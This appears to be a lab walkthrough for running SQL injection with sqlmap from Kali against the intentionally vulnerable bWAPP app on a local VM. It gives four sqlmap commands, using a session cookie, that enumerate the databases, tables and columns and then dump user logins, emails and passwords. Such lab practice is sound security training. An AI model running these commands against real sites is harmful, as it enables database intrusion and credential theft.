# Kali + bWAPP

1. install Kali and bWAPP vm in virtual box;

   ```
    ![](/assets/VirtualBox-2-VM)
   ```

   1. launch bWAP and make sure it is running; 

![](/assets/bWAPP-VM)

1. Launch Kali and make sure you can access the bWAPP from Iceweasel.![](/assets/access-bWAPP-from-kali)

2. Go to SQL Injection \(GET/Search\)

![](/assets/choose-SQL-GET)

1. key in a search string; copy of the resulted URL;

![](/assets/key-in-search-box)

![](/assets/SQL-get-URL)

1. Find out the cookie for the site;

   ![](/assets/get-cookie-1)

   ![](/assets/get-cookie-2)

2. launch SQLmap from terminal;

   **step1 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" --dbs

   ![](/assets/sql-all-dbs)

   **step2 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_--tables

   ![](/assets/sql-all-tables-bWAPP)

   **step3 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_-T _**users **_--columns

   ![](/assets/sql-all-col-table-users)

**step4 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D bWAPP -T users -C** login,email,password** --dump

```
  ![](/assets/sql-all-users-email-pwd)
```



